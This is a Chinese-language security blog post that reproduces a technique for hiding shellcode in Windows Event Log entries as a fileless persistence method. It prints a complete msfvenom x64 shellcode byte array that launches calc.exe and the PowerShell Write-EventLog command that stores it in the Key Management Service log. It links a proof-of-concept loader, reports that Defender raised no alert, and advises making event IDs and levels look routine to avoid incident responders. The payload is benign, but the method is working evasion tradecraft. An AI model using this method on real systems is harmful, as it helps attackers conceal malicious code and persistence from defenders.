# 巧用Windows事件日志“隐藏”载荷
# 背景
根据卡巴斯基发布的研究报告发现一项恶意活动，其中的技术涉及将shellcode直接放入Windows事件日志，Windows事件日志可以被攻击者用来掩盖特洛伊木马病毒的恶意使用。实现了”无文件”攻击技术，下面就利用该涉及的技术，简单尝试一下。
# 前置知识
## Windows事件日志
Windows默认事件日志查看器为eventvwr.msc，能实现简单的使用，Win+R键后输入eventvwr回车即能打开。Windows主要的日志在“Windows
日志”中，该文件夹中包含所有Windows系统上的五个标准类别。比较常用的Windows日志有系统日志、安全日志、应用程序日志这三个日志内容。
  * 应用程序
  * 安全
  * Setup
  * 系统
  * Forwarded Events
事件查看器的另一个“应用程序和服务日志”文件夹里，包含Windows系统中其它各类重要服务组件的事件日志。Windows
PowerShell日志在该集合中。
Windows事件日志文件实际上是以特定的数据结构的方式存储内容，每条记录事件的数据结构由9个字段组成，包括日志名称、来源、记录时间、事件ID、任务类别、级别、计算机、事件数据（EventData）等信息。其中事件数据
**仅支持消息和二进制数据** 。
## 写入事件日志
我们可以使用PowerShell操作Windows事件日志，其中Write-EventLog命令可以将事件写入事件日志，参考微软官方文档，其中参数对应上面介绍的字段：
执行命令
    Write-EventLog -LogName Application -Source edge -EventID 65535 -EntryType Information -Category 0 -Message "Hello World!"
在事件查看器中，可以看到事件ID为65535的日志成功创建在应用程序日志中，消息为Hello World!
# 简单复现
## 写 **入载荷**
只需在Write-EventLog中使用-RawData参数，就可以在事件日志字段中包含二进制数据，而且必须将二进制数据作为字节数组传到-RawData参数中。我们可以将其包含数据的十六进制字符串转换为字节数组，然后再传递。
首先，使用msfvenom生成弹计算器 payload。输出格式为十六进制字符串
利用工具网站转为字节数组
    $data = [Byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00)
使用密钥管理服务日志和KmsRequests作为源进行事件日志写入。
    Write-EventLog -LogName 'Key Management Service' -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message "Hello World!" -RawData $data
执行后，Payload已成功存储到事件日志当中。于事件日志的详细信息就能查看到。
## 执行载荷
为了提取并执行写入的载荷，这边用非常简单的C++程序和Python脚本进行证明，代码放在[这里](https://github.com/ldsaiyan/EventLogPersist)。
用Visual Studio编译PoC代码后放在环境中执行，从”隐藏”在事件日志Key Management
Services的第一条日志中提取二进制载荷数据并且成功执行。过程中defender并未对其进行告警。
另外使用Python的win32evtlog实现读取事件日志内容，然后也用非常常见的shellcode注入技术执行该载荷。
同样成功执行隐藏在事件日志中的载荷：
可以看到，对Windows事件日志写入和读取Shellcode，都是使用合法的API调用，所以能借此很好的对载荷进行隐藏。作为一种持久化方法，还是能有更好的玩法。例如配合DLL搜索顺序劫持加载恶意代码等。
# 注意事项
## **用户限制**
事件日志的写入权限问题。为了能在事件日志条目中存储有效负载，我们拿到的权限必须要能写入日志。
## **大小限制**
需要注意的另一个限制是，事件日志中可以存储的数据量有大小限制。基于事件消息字符串的最大字符限制为31,839个字符。
## **更持久**
在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\对应的日志名称下的条目中，存在一个EventMessageFile属性。如果在注入载荷的时候，事件ID不存在于该属性指定的源关联的事件消息文件中，则会出现下图这个日志消息：
为了能够更加的持久化不被发现，事件ID和级别等字段都应该伪装成日常日志的样子，以免被应急人员察觉到异常。
参考：